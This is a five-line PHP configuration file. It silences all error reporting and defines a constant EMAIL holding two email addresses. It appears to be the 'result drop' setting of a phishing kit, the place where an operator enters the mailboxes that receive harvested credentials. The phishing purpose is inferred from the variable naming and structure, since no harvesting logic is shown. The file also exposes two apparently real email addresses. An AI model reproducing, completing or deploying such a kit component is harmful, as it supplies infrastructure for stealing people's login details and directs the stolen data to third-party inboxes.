<?php
error_reporting(0);
$ur_email   = "grincoway@astralogbox.com, otclogz@gmail.com";
define("EMAIL", "$ur_email");
?>